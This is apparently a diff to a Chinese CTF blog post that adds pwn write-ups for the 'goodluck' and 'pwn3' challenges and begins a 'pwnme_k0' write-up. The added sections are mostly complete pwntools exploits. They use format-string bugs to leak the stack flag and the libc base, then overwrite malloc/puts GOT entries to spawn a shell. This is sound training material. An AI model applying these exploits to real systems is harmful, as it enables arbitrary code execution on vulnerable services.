@@ -330,14 +330,241 @@ if __name__ == '__main__':
 
 
 
-## 0x22 pwnme_k0 writeup
+## 0x22 goodluck writeup
+
+这道题没什么可说的，直接把栈上的 `flag` 打出来即可。
+
+`poc` :
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+
+
+def main(payload):
+    exp_file = remote("127.0.0.1", 10000)
+    exp_file.recvuntil("what's the flag")
+    exp_file.sendline(payload)
+    print(exp_file.recvall())
+
+
+if __name__ == '__main__':
+    for nums in range(0, 10):
+        main("%{nums}$s".format(nums=nums))
+```
+
+
+
+## 0x23 pwn3 writeup
+
+日常checksec
+
+```sh
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+看见了这道题并没有开启 `RELRO` , 也就是说可以修改 `got` 表。
+
+
+
+### 程序分析
+
+![pwn3](/image/2019-03-20-linux_pwn_format/pwn3.jpg)
+
+这个程序的结构体如下：
+
+```c
+struct file_list{
+	struct file{
+		char file_name[40];
+		char file_content[200];
+	}
+	int next_file;
+}
+```
+
+在 `get` 这里发现了格化式字符串漏洞。
+
+![pwn3_vulnerability ](/image/2019-03-20-linux_pwn_format/pwn3_vulnerability .png)
+
+
+
+### 利用思路
+
+这里我发现了有两个方式得到 `libc` 的基地址。
+
+1.通过 泄露栈空间上面的地址（由于这里栈空间的地址没有什么变化，所以可以从栈上面泄露函数地址。）
+
+2.由于我们用 `%s` 占位符往栈上面的地址读（可以我们写任意函数 `got` 上的地址，或者利用现成的 `malloc` 的`got` 地址）
+
+接下来我将利用这两种方式得到 `shell` ，得到 `shell` 的方式没什么可说的，直接放出 `poc`
+
+`poc_1` :
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+
+
+def login(exp_file):
+    password_raw = "sysbdmin"
+    password_enc = ""
+    for chars in password_raw:
+        password_enc += chr(ord(chars) - 1)
+    log.info("password:{password}".format(password=password_enc))
+    exp_file.recvuntil("Name (ftp.hacker.server:Rainism):")
+    exp_file.sendline(password_enc)
+
+
+def put_file(exp_file, name, value):
+    exp_file.recvuntil("ftp>")
+    exp_file.sendline("put")
+    exp_file.recvuntil("please enter the name of the file you want to upload:")
+    exp_file.sendline(name)
+    exp_file.recvuntil("then, enter the content:")
+    exp_file.sendline(value)
+
+
+def get_file(exp_file, name):
+    exp_file.recvuntil("ftp>")
+    exp_file.sendline("get")
+    exp_file.recvuntil("enter the file name you want to get:")
+    exp_file.sendline(name)
+
+
+def main():
+    debug = 1
+    if debug:
+        exp_file = process("/home/who/Desktop/pwn3")
+        elf_file = ELF("/home/who/Desktop/pwn3")
+        libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
+        one_gadget_offset = 0x3ac69  # execve("/bin/sh", esp+0x34(Null), environ)
+        # print(exp_file.libs())
+    else:
+        exp_file = remote("127.0.0.1", 10000)
+        elf_file = ELF("/home/who/Desktop/pwn3")
+        libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
+        one_gadget_offset = 0x3ac69
+        # print(exp_file.libs())
+
+    # Using a format string vulnerability to leak the base address of libc
+    login(exp_file)
+    put_file(exp_file, "aaaa", "%4$p")
+    get_file(exp_file, "aaaa")
+    libc_addr = int(exp_file.recv(10), 16) - 7 - libc_file.symbols['__underflow']
+    one_gadget_addr = libc_addr + one_gadget_offset
+    log.info("libc_addr:{libc_addr}".format(libc_addr=hex(libc_addr)))
+
+    # Change malloc_got to one gadget address
+    malloc_got = elf_file.got['malloc']
+    log.info("malloc_got:{malloc_got}".format(malloc_got=hex(malloc_got)))
+    payload = fmtstr_payload(7, {malloc_got: one_gadget_addr})
+    put_file(exp_file, "bbbb", payload)
+    get_file(exp_file, "bbbb")
+
+    # To trigger malloc(one_gadget)
+    exp_file.recvuntil("ftp>")
+    exp_file.sendline("put")
+    exp_file.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+
+`poc_2` :
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+
+
+def login(exp_file):
+    password_raw = "sysbdmin"
+    password_enc = ""
+    for chars in password_raw:
+        password_enc += chr(ord(chars) - 1)
+    log.info("password:{password}".format(password=password_enc))
+    exp_file.recvuntil("Name (ftp.hacker.server:Rainism):")
+    exp_file.sendline(password_enc)
+
+
+def put_file(exp_file, name, value):
+    exp_file.recvuntil("ftp>")
+    exp_file.sendline("put")
+    exp_file.recvuntil("please enter the name of the file you want to upload:")
+    exp_file.sendline(name)
+    exp_file.recvuntil("then, enter the content:")
+    exp_file.sendline(value)
+
+
+def get_file(exp_file, name):
+    exp_file.recvuntil("ftp>")
+    exp_file.sendline("get")
+    exp_file.recvuntil("enter the file name you want to get:")
+    exp_file.sendline(name)
+
+
+def main():
+    debug = 1
+    if debug:
+        exp_file = process("/home/who/Desktop/pwn3")
+        elf_file = ELF("/home/who/Desktop/pwn3")
+        libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
+        # print(exp_file.libs())
+    else:
+        exp_file = remote("127.0.0.1", 10000)
+        elf_file = ELF("/home/who/Desktop/pwn3")
+        libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
+        # print(exp_file.libs())
+
+    # Using a format string vulnerability to leak the base address of libc
+    login(exp_file)
+    put_file(exp_file, "aaaa", p32(elf_file.got['puts'])+"%7$s")
+    get_file(exp_file, "aaaa")
+    libc_addr = u32(exp_file.recv(8)[4:8]) - libc_file.symbols['puts']
+    system_addr = libc_addr + libc_file.symbols['system']
+    log.info("libc_addr:{libc_addr}".format(libc_addr=hex(libc_addr)))
+
+    # Change puts_got to address of system function
+    puts_got = elf_file.got['puts']
+    log.info("puts_got:{puts_got}".format(puts_got=hex(puts_got)))
+    payload = fmtstr_payload(7, {puts_got: system_addr})
+    put_file(exp_file, "/bin/sh;", payload)
+    get_file(exp_file, "/bin/sh;")
+
+    # To trigger puts("/bin/sh;")/system("/bin/sh;")
+    exp_file.recvuntil("ftp>")
+    exp_file.sendline("dir")
+    exp_file.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+
+## 0x24 pwnme_k0 writeup
 
 拿到这个文件的时候，那时候提供的环境里面并没有 `ida` 只有关键部分的伪 `c代码` ，这个就有点蛋疼了，由于比赛时间太短了（客观借口，主要是我菜），所以这道题在比赛的时候我并没有调试出来，所以我决定赛后分析一下这道题。
 
 首先先 `checksec` 一下程序
 
 ```sh
-
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
 ```
 
 看见开启了 `NX` 、`RELRO` ，不能够修改 `got` 表这就有点难受了。
